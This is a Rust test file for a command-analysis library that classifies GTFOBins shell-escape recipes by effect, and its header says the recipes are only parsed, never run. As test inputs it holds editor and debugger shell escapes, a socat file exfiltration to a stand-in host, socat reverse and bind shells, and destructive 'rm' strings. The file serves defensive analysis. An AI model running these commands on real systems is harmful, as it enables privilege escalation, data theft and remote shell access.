//! Group C contracts for the final GTFOBins profile batch. Recipes are parsed, never run.
use caushell_parse::parse_command;
use caushell_profile::*;
use caushell_types::ShellKind;

const PROFILES: [(&str, &str); 31] = [
    ("crash", include_str!("../profiles/crash.yaml")),
    ("emacs", include_str!("../profiles/emacs.yaml")),
    ("ex", include_str!("../profiles/ex.yaml")),
    ("ftp", include_str!("../profiles/ftp.yaml")),
    ("gdb", include_str!("../profiles/gdb.yaml")),
    ("gimp", include_str!("../profiles/gimp.yaml")),
    ("ksh", include_str!("../profiles/ksh.yaml")),
    ("lftp", include_str!("../profiles/lftp.yaml")),
    ("ncftp", include_str!("../profiles/ncftp.yaml")),
    ("nvim", include_str!("../profiles/nvim.yaml")),
    ("pico", include_str!("../profiles/pico.yaml")),
    ("posh", include_str!("../profiles/posh.yaml")),
    ("psftp", include_str!("../profiles/psftp.yaml")),
    ("rc", include_str!("../profiles/rc.yaml")),
    ("red", include_str!("../profiles/red.yaml")),
    ("rlogin", include_str!("../profiles/rlogin.yaml")),
    ("rtorrent", include_str!("../profiles/rtorrent.yaml")),
    ("run-mailcap", include_str!("../profiles/run-mailcap.yaml")),
    ("rview", include_str!("../profiles/rview.yaml")),
    ("rvim", include_str!("../profiles/rvim.yaml")),
    ("sash", include_str!("../profiles/sash.yaml")),
    ("sftp", include_str!("../profiles/sftp.yaml")),
    ("smbclient", include_str!("../profiles/smbclient.yaml")),
    ("socat", include_str!("../profiles/socat.yaml")),
    ("sshfs", include_str!("../profiles/sshfs.yaml")),
    ("view", include_str!("../profiles/view.yaml")),
    ("vigr", include_str!("../profiles/vigr.yaml")),
    ("vimdiff", include_str!("../profiles/vimdiff.yaml")),
    ("vipw", include_str!("../profiles/vipw.yaml")),
    ("wireshark", include_str!("../profiles/wireshark.yaml")),
    ("yash", include_str!("../profiles/yash.yaml")),
];

fn bind(source: &str, command: &str) -> BoundInvocation {
    let profile = load_command_profile_from_str(source).unwrap();
    let parsed = parse_command(command, ShellKind::Bash).unwrap();
    let projected = project_invocation(&parsed.commands[0], InvocationRuntimeContext::new());
    let selected = select_invocation(&profile, &projected).unwrap();
    bind_invocation(&profile, &projected, &selected)
}

fn has_effect(bound: &BoundInvocation, kind: EffectKind) -> bool {
    bound.effects.iter().any(|effect| effect.kind == kind)
}

fn argument_values(bound: &BoundInvocation, name: &str) -> Vec<String> {
    bound
        .bound_parameters
        .iter()
        .filter(|parameter| parameter.name.as_str() == name)
        .flat_map(|parameter| &parameter.values)
        .filter_map(|value| match value {
            BoundValue::Argument { text, .. } => Some(text.clone()),
            _ => None,
        })
        .collect()
}

fn child_streams(bound: &BoundInvocation) -> Option<(bool, bool, bool)> {
    bound
        .effects
        .iter()
        .find_map(|effect| match &effect.target {
            EffectTarget::Dispatch(target) => Some((
                target.stdin_from_parent,
                target.stdin_from_tool,
                target.stdout_to_parent,
            )),
            _ => None,
        })
}

#[test]
fn every_assigned_profile_loads_with_its_own_identity_and_research_limits() {
    for (name, source) in PROFILES {
        let profile =
            load_command_profile_from_str(source).unwrap_or_else(|error| panic!("{name}: {error}"));
        assert_eq!(profile.identity.canonical_name.as_str(), name);
        assert!(
            profile
                .extensions
                .contains_key("caushell.profile/source_research"),
            "{name}"
        );
        assert!(
            profile
                .extensions
                .contains_key("caushell.profile/known_limitations"),
            "{name}"
        );
    }
}

#[test]
fn opaque_native_code_does_not_become_shell_argv() {
    for (name, source, command, form) in [
        (
            "ex",
            PROFILES[2].1,
            "ex -c ':!/bin/sh'",
            "ex_command_string",
        ),
        (
            "gdb",
            PROFILES[4].1,
            "gdb -nx -ex '!/bin/sh' -ex quit",
            "gdb_eval_command",
        ),
        (
            "gimp",
            PROFILES[5].1,
            "gimp -idf --batch-interpreter=python-fu-eval -b 'x=1'",
            "python_fu_batch_eval",
        ),
        (
            "emacs",
            PROFILES[1].1,
            "emacs -Q -nw --eval '(term \"/bin/sh\")'",
            "emacs_eval_expression",
        ),
        (
            "ksh",
            PROFILES[6].1,
            "ksh -c 'echo \"$HOME\"'",
            "ksh_command_string",
        ),
        (
            "lftp",
            PROFILES[7].1,
            "lftp -c '!/bin/sh'",
            "lftp_command_string",
        ),
        (
            "smbclient",
            PROFILES[22].1,
            "smbclient '\\\\host\\share' -c 'get /tmp/in /tmp/out'",
            "smbclient_command_list",
        ),
    ] {
        let bound = bind(source, command);
        assert_eq!(bound.form_id.as_str(), form, "{name}: {bound:#?}");
        assert!(
            has_effect(&bound, EffectKind::ExecutePayload),
            "{name}: {bound:#?}"
        );
        assert!(
            !has_effect(&bound, EffectKind::DispatchCommand),
            "{name}: {bound:#?}"
        );
        if name == "gdb" {
            assert!(!bound.operation_semantics_unresolved, "{name}: {bound:#?}");
        }
    }
}

#[test]
fn gdb_information_options_terminate_without_expanding_commands() {
    let bound = bind(PROFILES[4].1, "gdb --help -ex 'shell id'");
    assert_eq!(bound.form_id.as_str(), "show_help");
    assert!(!bound.operation_semantics_unresolved, "{bound:#?}");
    assert!(
        !has_effect(&bound, EffectKind::ExecutePayload),
        "{bound:#?}"
    );
    assert!(
        !has_effect(&bound, EffectKind::DispatchCommand),
        "{bound:#?}"
    );
}

#[test]
fn transfer_prompts_are_native_interactive_inputs_not_transfers_at_startup() {
    for (source, command) in [
        (PROFILES[3].1, "ftp -a example.test"),
        (PROFILES[8].1, "ncftp"),
        (PROFILES[12].1, "psftp example.test"),
        (PROFILES[21].1, "sftp user@example.test"),
    ] {
        let bound = bind(source, command);
        assert!(
            has_effect(&bound, EffectKind::OpenInteractiveEscapeSurface),
            "{command}: {bound:#?}"
        );
        assert!(
            !has_effect(&bound, EffectKind::DispatchCommand),
            "{command}: {bound:#?}"
        );
    }
}

#[test]
fn restricted_editor_aliases_do_not_inherit_unrestricted_escape_capability() {
    for (name, source) in [
        ("rview", PROFILES[18].1),
        ("rvim", PROFILES[19].1),
        ("red", PROFILES[14].1),
    ] {
        let profile = load_command_profile_from_str(source).unwrap();
        assert_eq!(profile.identity.canonical_name.as_str(), name);
        let surface = profile
            .forms
            .iter()
            .flat_map(|form| &form.effects)
            .find_map(|effect| effect.interactive_escape_surface.as_ref())
            .unwrap();
        assert!(surface.capabilities.is_empty(), "{name}: {surface:#?}");
    }
    assert_eq!(
        load_command_profile_from_str(PROFILES[25].1)
            .unwrap()
            .identity
            .canonical_name
            .as_str(),
        "view"
    );
}

#[test]
fn socat_declared_address_grammar_preserves_input_output_paths_and_local_command() {
    let read = bind(PROFILES[23].1, "socat -u file:/tmp/input -");
    assert_eq!(read.form_id.as_str(), "read_from_file_address");
    assert!(has_effect(&read, EffectKind::ReadPath), "{read:#?}");
    assert_eq!(
        read.stream_contract.unwrap().stdout_mode,
        StreamOutputMode::Data
    );

    let write = bind(
        PROFILES[23].1,
        "socat -u 'exec:echo DATA' open:/tmp/output,creat",
    );
    assert_eq!(write.form_id.as_str(), "write_to_open_address");
    assert!(
        has_effect(&write, EffectKind::DispatchCommand),
        "{write:#?}"
    );
    assert!(has_effect(&write, EffectKind::WritePath), "{write:#?}");
    assert_eq!(child_streams(&write), Some((false, true, false)));

    let upload = bind(
        PROFILES[23].1,
        "socat -u file:/tmp/sensitive tcp-connect:exfil.test:12345",
    );
    assert!(
        has_effect(&upload, EffectKind::NetworkEndpoint),
        "{upload:#?}"
    );
    assert_eq!(
        argument_values(&upload, "output_address"),
        ["tcp-connect:exfil.test:12345"]
    );

    let reverse = bind(
        PROFILES[23].1,
        "socat -U file:/tmp/sensitive tcp-connect:source.test:12345",
    );
    assert_eq!(reverse.form_id.as_str(), "file_first_reverse_receive");
    assert!(has_effect(&reverse, EffectKind::WritePath), "{reverse:#?}");
    assert!(!has_effect(&reverse, EffectKind::ReadPath), "{reverse:#?}");
    assert!(
        has_effect(&reverse, EffectKind::NetworkEndpoint),
        "{reverse:#?}"
    );

    let opposite = bind(
        PROFILES[23].1,
        "socat -U tcp-connect:exfil.test:12345 file:/tmp/upload-source",
    );
    assert_eq!(opposite.form_id.as_str(), "file_second_reverse_upload");
    assert!(has_effect(&opposite, EffectKind::ReadPath), "{opposite:#?}");
    assert!(
        !has_effect(&opposite, EffectKind::WritePath),
        "{opposite:#?}"
    );
}

#[test]
fn socat_exec_streams_are_owned_by_addresses_not_parent_stdio() {
    let reverse = bind(
        PROFILES[23].1,
        "socat tcp-connect:remote.test:12345 exec:/bin/sh,pty",
    );
    assert_eq!(child_streams(&reverse), Some((false, true, false)));
    let listener = bind(
        PROFILES[23].1,
        "socat tcp-listen:12345,reuseaddr,fork exec:/bin/sh,pty",
    );
    assert_eq!(child_streams(&listener), Some((false, true, false)));
    let stdio = bind(PROFILES[23].1, "socat - exec:/bin/sh,pty");
    assert_eq!(child_streams(&stdio), Some((true, false, true)));
}

#[test]
fn aliases_keep_native_identity_and_editor_file_operands_remain_paths() {
    let vim = bind(PROFILES[9].1, "nvim /tmp/input");
    assert_eq!(vim.form_id.as_str(), "neovim_ui");
    assert!(has_effect(&vim, EffectKind::ReadPath), "{vim:#?}");
    let pico = bind(PROFILES[10].1, "pico /tmp/input");
    assert_eq!(pico.form_id.as_str(), "pico_editor");
    assert!(has_effect(&pico, EffectKind::ReadPath), "{pico:#?}");
}

#[test]
fn helper_and_capture_options_have_typed_boundaries() {
    let sshfs = bind(
        PROFILES[24].1,
        "sshfs -o ssh_command=/path/to/command x: /path/to/dir/",
    );
    assert_eq!(sshfs.form_id.as_str(), "sshfs_custom_helper");
    assert!(has_effect(&sshfs, EffectKind::ExecutePayload), "{sshfs:#?}");
    assert!(has_effect(&sshfs, EffectKind::ReadPath), "{sshfs:#?}");
    assert!(
        !has_effect(&sshfs, EffectKind::DispatchCommand),
        "{sshfs:#?}"
    );

    let sshfs_option = bind(PROFILES[24].1, "sshfs -o allow_other x: /mnt/x");
    assert_eq!(sshfs_option.form_id.as_str(), "sshfs_mount");
    assert!(
        !has_effect(&sshfs_option, EffectKind::ExecutePayload),
        "{sshfs_option:#?}"
    );
    let sshfs_reconnect = bind(PROFILES[24].1, "sshfs -o reconnect x: /mnt/x");
    assert_eq!(sshfs_reconnect.form_id.as_str(), "sshfs_mount");
    assert!(
        !has_effect(&sshfs_reconnect, EffectKind::ExecutePayload),
        "{sshfs_reconnect:#?}"
    );
    let sshfs_command = bind(PROFILES[24].1, "sshfs -o 'ssh_command=sh -c id' x: /mnt/x");
    assert_eq!(sshfs_command.form_id.as_str(), "sshfs_custom_helper_opaque");
    assert!(
        has_effect(&sshfs_command, EffectKind::ExecutePayload),
        "{sshfs_command:#?}"
    );
    assert!(
        !has_effect(&sshfs_command, EffectKind::DispatchCommand),
        "{sshfs_command:#?}"
    );

    let wireshark = bind(
        PROFILES[29].1,
        "wireshark -c 1 -i lo -k -f 'udp port 12345'",
    );
    assert_eq!(wireshark.form_id.as_str(), "wireshark_capture_ui");
    assert!(!wireshark.operation_semantics_unresolved, "{wireshark:#?}");
    assert!(
        has_effect(&wireshark, EffectKind::ExecutePayload),
        "{wireshark:#?}"
    );
    assert!(
        !has_effect(&wireshark, EffectKind::DispatchCommand),
        "{wireshark:#?}"
    );
}

#[test]
fn shell_command_and_script_inputs_stay_opaque_and_noninteractive() {
    for (source, command, form) in [
        (
            PROFILES[11].1,
            "posh -c 'rm /opt/shared/victim'",
            "posh_command_string",
        ),
        (
            PROFILES[11].1,
            "posh /opt/shared/script",
            "posh_script_file",
        ),
        (
            PROFILES[13].1,
            "rc -c 'rm /opt/shared/victim'",
            "rc_command_string",
        ),
        (PROFILES[13].1, "rc /opt/shared/script", "rc_script_file"),
        (
            PROFILES[20].1,
            "sash -c 'rm /opt/shared/victim'",
            "sash_command_string",
        ),
        (
            PROFILES[20].1,
            "sash -f /opt/shared/script",
            "sash_script_file",
        ),
        (
            PROFILES[30].1,
            "yash -c 'rm /opt/shared/victim'",
            "yash_command_string",
        ),
        (
            PROFILES[30].1,
            "yash /opt/shared/script",
            "yash_script_file",
        ),
        (PROFILES[6].1, "ksh /opt/shared/script", "ksh_script_file"),
    ] {
        let bound = bind(source, command);
        assert_eq!(bound.form_id.as_str(), form, "{command}: {bound:#?}");
        assert!(
            has_effect(&bound, EffectKind::ExecutePayload),
            "{command}: {bound:#?}"
        );
        assert!(
            !has_effect(&bound, EffectKind::OpenInteractiveEscapeSurface),
            "{command}: {bound:#?}"
        );
        assert!(
            !has_effect(&bound, EffectKind::DispatchCommand),
            "{command}: {bound:#?}"
        );
    }
}

#[test]
fn native_database_and_spell_helper_arguments_are_not_editor_buffers() {
    for (source, command, form, expected_path) in [
        (PROFILES[28].1, "vipw", "passwd_editor_ui", "/etc/passwd"),
        (
            PROFILES[28].1,
            "vipw -s",
            "shadow_database_editor_ui",
            "/etc/shadow",
        ),
        (PROFILES[26].1, "vigr", "group_editor_ui", "/etc/group"),
        (
            PROFILES[26].1,
            "vigr -s",
            "gshadow_database_editor_ui",
            "/etc/gshadow",
        ),
    ] {
        let bound = bind(source, command);
        assert_eq!(bound.form_id.as_str(), form, "{command}: {bound:#?}");
        assert!(bound.effects.iter().any(|effect| matches!(&effect.target, EffectTarget::ConfiguredPath(path) if path.default_value.as_deref() == Some(expected_path))), "{command}: {bound:#?}");
    }

    let pico = bind(PROFILES[10].1, "pico -s /bin/sh");
    assert_eq!(pico.form_id.as_str(), "pico_spell_helper");
    assert!(has_effect(&pico, EffectKind::ExecutePayload), "{pico:#?}");
    assert!(has_effect(&pico, EffectKind::ReadPath), "{pico:#?}");
    assert!(
        !argument_values(&pico, "file_paths").contains(&"/bin/sh".to_string()),
        "{pico:#?}"
    );
}

#[test]
fn native_command_file_options_bind_their_real_script_paths() {
    let gdb = bind(PROFILES[4].1, "gdb -x /tmp/commands.gdb");
    assert_eq!(gdb.form_id.as_str(), "gdb_command_file");
    assert!(has_effect(&gdb, EffectKind::ReadPath), "{gdb:#?}");
    assert!(has_effect(&gdb, EffectKind::ExecutePayload), "{gdb:#?}");

    for (source, command, form) in [
        (PROFILES[9].1, "nvim -S /tmp/init.vim", "neovim_script_file"),
        (
            PROFILES[18].1,
            "rview -S /tmp/init.vim",
            "restricted_vim_script_file",
        ),
        (
            PROFILES[19].1,
            "rvim -S /tmp/init.vim",
            "restricted_vim_script_file",
        ),
        (PROFILES[25].1, "view -S /tmp/init.vim", "vim_script_file"),
        (
            PROFILES[27].1,
            "vimdiff -S /tmp/init.vim",
            "vimdiff_script_file",
        ),
    ] {
        let bound = bind(source, command);
        assert_eq!(bound.form_id.as_str(), form, "{command}: {bound:#?}");
        assert!(
            has_effect(&bound, EffectKind::ReadPath),
            "{command}: {bound:#?}"
        );
        assert!(
            has_effect(&bound, EffectKind::ExecutePayload),
            "{command}: {bound:#?}"
        );
    }
}

#[test]
fn run_mailcap_mime_path_projection_keeps_absolute_root() {
    let view = bind(
        PROFILES[17].1,
        "run-mailcap view application/octet-stream:/opt/shared/report",
    );
    assert_eq!(view.form_id.as_str(), "view_mailcap_positional_action");
    assert!(has_effect(&view, EffectKind::ReadPath), "{view:#?}");
}
